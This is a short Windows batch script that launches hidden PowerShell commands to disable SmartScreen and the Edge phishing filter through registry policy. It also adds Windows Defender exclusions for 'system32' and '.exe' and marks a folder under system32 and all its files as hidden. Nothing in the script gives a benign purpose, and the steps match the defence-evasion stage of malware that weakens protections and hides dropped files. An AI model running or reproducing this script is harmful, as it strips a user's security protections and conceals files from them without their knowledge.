@echo off

echo Running script 1...
PowerShell.exe -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Type DWord -Value 0"
PowerShell.exe -WindowStyle Hidden -Command "If (!(Test-Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter')) {New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter' -Force | Out-Null}"
PowerShell.exe -WindowStyle Hidden -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter' -Name 'EnabledV9' -Type DWord -Value 0"
echo Script 1 completed.

echo Running script 2...
PowerShell.exe -WindowStyle Hidden -Command "Set-MpPreference -ExclusionPath @('system32' , '.exe')"
echo Script 2 completed.

echo Running script 3...
set "folder=%windir%\system32\1032"
attrib +h "%folder%"
for /f "delims=" %%i in ('dir "%folder%" /a:-h /b /s') do (
    attrib +h "%%i"
)
echo Script 3 completed.

echo All scripts completed.
